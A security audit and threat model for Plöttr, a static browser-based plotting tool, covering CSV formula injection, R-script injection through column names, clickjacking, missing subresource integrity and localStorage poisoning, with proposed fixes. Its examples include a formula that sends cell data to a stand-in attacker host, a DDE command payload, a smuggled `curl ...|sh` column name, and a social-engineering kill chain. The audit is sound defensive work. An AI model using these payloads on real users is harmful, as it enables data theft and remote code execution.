# Plöttr security audit — 2026-05-02

Honest threat model. Plöttr's deployment shape (browser-only, static, no
server, no auth, no analytics) eliminates entire categories outright —
anything server-side, any session/identity attack, any database
injection. What's left:

---

## Tier A — actually exploitable today

### 1. CSV / Excel formula injection (laundering)

The most realistic attack. Scenario: a colleague (or a public dataset)
hands you a CSV with a cell like `=HYPERLINK("http://atk/x?d="&A1,"Click")`
or the legacy DDE `@SUM(cmd|'/c calc'!A0)`. You open it in Plöttr, do
your analysis, click `⬇ CSV` (or the new `↗ Open in Boxplot` button —
same plumbing), then open the _downloaded_ file in Excel / LibreOffice.
The spreadsheet engine evaluates the formula and exfiltrates / runs
whatever the attacker planted.

Plöttr itself never executes the formula — it just round-trips the cell
as text. But every export path is a laundering vector: `downloadCsv`,
`buildCsvString`, the per-replicate Σ CSV in the new aequorin hand-off,
the calibrated-data CSV in RLU timecourse, the boxplot/scatter/lineplot
CSVs. None of them sanitise leading `=` / `+` / `-` / `@` / tab / `\r` —
the standard OWASP CSV-injection mitigation. **Real attack,
well-documented, and the only one in this list with an
attacker-already-runs-code endgame.**

Fix shape: in `buildCsvString` (and any sibling), prefix any cell whose
first character is in `[=+\-@\t\r]` with a single `'` quote (Excel's
"treat as text" sigil). Trade-off: cells genuinely starting with `=`
lose that character on round-trip. Acceptable for scientific data.

### 2. R-script injection via column names

The `# Plöttr — R script export` modules build R source from user data.
`sanitizeRString` escapes `"` and `\` for string literals but the user's
column **identifiers** can land in code positions too (e.g. as object
keys, factor levels, list names). A column named
`"); system("curl atk.com|sh"); foo <- c("` — does `sanitizeRString`
close the cycle, or does the surrounding R-script template assume
identifiers are safe?

The user runs the downloaded script in RStudio, fully trusting it as
their own analysis. If they have R 4.x with default permissions,
`system()` runs arbitrary shell. **High impact if exploitable**,
mitigated only by the export tests in `tests/r-export.test.js`. Worth
one targeted audit pass: walk the four `buildRScript*` modules with a
hostile column name and read what lands in the output.

### 3. Hostile-embedder clickjacking

GitHub Pages doesn't let us set HTTP headers, so no `X-Frame-Options` /
`frame-ancestors` CSP. A malicious site can iframe `plottr.bio` (or
`evompmi.github.io/plottr/`) and overlay decoy UI to trick a user into
clicking the wrong button — most plausibly the `↗ Open in Boxplot` or a
download trigger that round-trips attacker-supplied data. Damage ceiling
is "user downloads / re-uploads their own clipboard contents into a
context that lets the attacker observe", since the app holds no remote
secrets.

Fix shape: an inline `<script>` in every HTML head that does
`if (top !== self && new URL(document.referrer).origin !== location.origin) document.body.innerHTML = '<a href="…">Open in a top-level tab</a>'`.
Breaks legitimate iframe embeds (academic notebook, demo blog post). The
`frame-ancestors` CSP in a `<meta http-equiv>` tag is **deliberately
ignored by browsers** — only the HTTP header version works — so the
script-based bust-out is the only option on GitHub Pages.

---

## Tier B — worth tightening, lower impact

### 4. Vendored React without subresource integrity

`vendor/react.production.min.js` and `vendor/react-dom.production.min.js`
ship as plain `<script src="…">`. A repo compromise (a malicious PR
slipping a mod into the vendor copy, a force-push to `gh-pages`)
propagates a backdoored React to every visitor on the next page load
with zero detection. Adding `integrity="sha384-…"` and
`crossorigin="anonymous"` to those two `<script>` tags pins the bytes —
any future tampering forces a hash regen and so passes through normal
review. Same shape applies to the vendored MathJax / KaTeX assets if any
(didn't see them; vendor/ is just React + LICENSE).

### 5. Inline scripts everywhere → no useful CSP possible

Every HTML file has multiple inline `<script>` blocks (theme preloader,
version display, tool registration, theme toggle wiring). A meta-CSP
`script-src 'self'` would break them all; allowing `'unsafe-inline'`
defeats CSP's main value. To get a real CSP, every inline script would
need to move to an external file or carry a `nonce` (impossible for
static deploys, since nonce must be unique per response). Net
assessment: skip CSP for now; it'd be all cost, no security gain on
this deployment shape.

### 6. localStorage cross-tab poisoning

`dataviz-aequorin-prefs`, `dataviz-handoff`, `dataviz-theme` and friends
have no integrity check. If the user has a malicious extension
installed, or another tab on the same origin (which on
`evompmi.github.io` could in principle be another user's GitHub Pages
project), that party can write into Plöttr's keys. `loadAutoPrefs`
validates schema and falls back gracefully on garbage; `consumeHandoff`
validates `tool` field and clears on any mismatch. Practical risk: low.
Worth knowing: `evompmi.github.io` is a project domain shared with every
other repo of yours that ships Pages — those _are_ same-origin and could
in principle write to Plöttr's localStorage. A custom domain
(`plottr.bio`) eliminates this.

### 7. Source-map exposure (`*.js.map` files on gh-pages)

Each compiled tool ships its sourcemap with `sourcesContent` inlined —
full TSX source materialised on the live deploy. Not actually a risk
(the same source is in the public GitHub repo) but worth knowing the
deployed app is fully introspectable; an attacker doesn't need to clone
the repo to read internals.

---

## Tier C — accepted / out of scope

- **Browser extension attacks** — out of model. A malicious extension
  can read all storage, inject scripts, intercept downloads. Plöttr
  can't defend against it.
- **MITM on the user's connection** — GitHub Pages serves over HTTPS
  with HSTS; standard mitigations apply.
- **2 MB ingest cap as a DoS limit** — `FILE_LIMIT_BYTES` already caps
  memory; a 1.9 MB pathological CSV could lock the tab for a few
  seconds, but the impact is limited to the user's own tab. Acceptable.
- **Math.random / Park-Miller LCG** — used only for chart-specific
  reproducibility, never for security. Fine.
- **No password / secret handling** — nothing for an attacker to steal
  from Plöttr itself.

---

## Skilled-and-nasty endgame

The realistic kill chain for a determined attacker who specifically
wants Plöttr users:

1. Hosts a "biology-friendly demo dataset" CSV containing
   formula-injection cells **and** column names crafted to escape the
   R-script template.
2. Posts it in a relevant Slack / Twitter / lab-mate email, framed as
   "great example for the Σ-barplot tool".
3. Victim loads in Plöttr, runs analysis, downloads the cleaned CSV →
   opens in Excel → formula fires (#1). OR downloads R script → runs in
   RStudio → `system()` fires (#2).
4. Optional: attacker hosts a clickjacking page (#3) overlaying Plöttr
   to make the wrong "open in" button get clicked, automating the
   round-trip.

The supply-chain bites the entire userbase at once (#4) but requires
repo or Pages compromise, which is a different kind of attacker.

If I were prioritising one fix: **#1 (CSV injection)**. Five lines of
code in `buildCsvString`, mitigates the most realistic kill chain, no
behaviour change for legitimate data.
